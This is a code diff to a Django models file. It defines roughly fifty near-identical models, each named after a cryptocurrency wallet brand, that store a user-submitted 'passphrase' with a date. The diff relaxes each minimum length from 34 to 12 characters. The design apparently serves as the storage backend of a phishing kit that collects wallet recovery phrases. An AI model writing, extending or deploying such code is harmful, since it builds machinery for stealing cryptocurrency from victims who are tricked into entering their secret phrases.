@@ -3,7 +3,7 @@ from django.core.validators import MinLengthValidator
 
 # Create your models here.
 class BitPay(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -13,7 +13,7 @@ class BitPay(models.Model):
         return self.passphrase
 
 class Solana(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -23,7 +23,7 @@ class Solana(models.Model):
         return self.passphrase
 
 class Trust(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -33,7 +33,7 @@ class Trust(models.Model):
         return self.passphrase
 
 class Metamask(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -43,7 +43,7 @@ class Metamask(models.Model):
         return self.passphrase
 
 class HuobiWallet(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -53,7 +53,7 @@ class HuobiWallet(models.Model):
         return self.passphrase
 
 class Phantom(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -63,7 +63,7 @@ class Phantom(models.Model):
         return self.passphrase
 
 class Wazirx(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -73,7 +73,7 @@ class Wazirx(models.Model):
         return self.passphrase
 
 class Pillar(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -83,7 +83,7 @@ class Pillar(models.Model):
         return self.passphrase
 
 class Tokenpocket(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -93,7 +93,7 @@ class Tokenpocket(models.Model):
         return self.passphrase
 
 class Atomic(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -103,7 +103,7 @@ class Atomic(models.Model):
         return self.passphrase
 
 class Walleth(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -113,7 +113,7 @@ class Walleth(models.Model):
         return self.passphrase
 
 class Authereum(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -123,7 +123,7 @@ class Authereum(models.Model):
         return self.passphrase
 
 class Eidoo(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -133,7 +133,7 @@ class Eidoo(models.Model):
         return self.passphrase
 
 class Zelcore(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -143,7 +143,7 @@ class Zelcore(models.Model):
         return self.passphrase
 
 class Nash(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -153,7 +153,7 @@ class Nash(models.Model):
         return self.passphrase
 
 class Coinomi(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -163,7 +163,7 @@ class Coinomi(models.Model):
         return self.passphrase
 
 class Gridplus(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -173,7 +173,7 @@ class Gridplus(models.Model):
         return self.passphrase
 
 class CoolWalletS(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -183,7 +183,7 @@ class CoolWalletS(models.Model):
         return self.passphrase
 
 class Alice(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -193,7 +193,7 @@ class Alice(models.Model):
         return self.passphrase
 
 class AlphaWallet(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -203,7 +203,7 @@ class AlphaWallet(models.Model):
         return self.passphrase
 
 class Tokenary(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -213,7 +213,7 @@ class Tokenary(models.Model):
         return self.passphrase
 
 class Safepal(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -223,7 +223,7 @@ class Safepal(models.Model):
         return self.passphrase
 
 class Equal(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -233,7 +233,7 @@ class Equal(models.Model):
         return self.passphrase
 
 class Infinito(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -243,7 +243,7 @@ class Infinito(models.Model):
         return self.passphrase
 
 class Mathwallet(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -253,7 +253,7 @@ class Mathwallet(models.Model):
         return self.passphrase
 
 class MyKey(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -263,7 +263,7 @@ class MyKey(models.Model):
         return self.passphrase
 
 class Spatium(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -273,7 +273,7 @@ class Spatium(models.Model):
         return self.passphrase
 
 class Walletio(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -286,7 +286,7 @@ class Walletio(models.Model):
         return self.passphrase
 
 class InfinityWallet(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -299,7 +299,7 @@ class InfinityWallet(models.Model):
         return self.passphrase
 
 class OwnBit(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -309,7 +309,7 @@ class OwnBit(models.Model):
         return self.passphrase
 
 class EasyPocket(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -319,7 +319,7 @@ class EasyPocket(models.Model):
         return self.passphrase
 
 class ONTO(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -329,7 +329,7 @@ class ONTO(models.Model):
         return self.passphrase
 
 class BridgeWallet(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -342,7 +342,7 @@ class BridgeWallet(models.Model):
         return self.passphrase
 
 class SparkPoint(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -352,7 +352,7 @@ class SparkPoint(models.Model):
         return self.passphrase
 
 class ViaWallet(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -362,7 +362,7 @@ class ViaWallet(models.Model):
         return self.passphrase
 
 class Coin98(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -372,7 +372,7 @@ class Coin98(models.Model):
         return self.passphrase
 
 class BitKeep(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -382,7 +382,7 @@ class BitKeep(models.Model):
         return self.passphrase
 
 class Vision(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -392,7 +392,7 @@ class Vision(models.Model):
         return self.passphrase
 
 class SFWTWallet(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -405,7 +405,7 @@ class SFWTWallet(models.Model):
         return self.passphrase
 
 class PeakDefi(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -415,7 +415,7 @@ class PeakDefi(models.Model):
         return self.passphrase
 
 class XDCWallet(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -428,7 +428,7 @@ class XDCWallet(models.Model):
         return self.passphrase
 
 class UnstoppableWallet(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -441,7 +441,7 @@ class UnstoppableWallet(models.Model):
         return self.passphrase
 
 class MEETONE(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -454,7 +454,7 @@ class MEETONE(models.Model):
         return self.passphrase
 
 class DOKWallet(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -467,7 +467,7 @@ class DOKWallet(models.Model):
         return self.passphrase
 
 class ATWallet(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -480,7 +480,7 @@ class ATWallet(models.Model):
         return self.passphrase
 
 class MoriXWallet(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -493,7 +493,7 @@ class MoriXWallet(models.Model):
         return self.passphrase
 
 class MidasWallet(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
@@ -506,7 +506,7 @@ class MidasWallet(models.Model):
         return self.passphrase
 
 class Others(models.Model):
-    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(34)])
+    passphrase = models.CharField(max_length=100, validators=[MinLengthValidator(12)])
     date = models.DateTimeField(auto_now_add=True)
 
     class Meta:
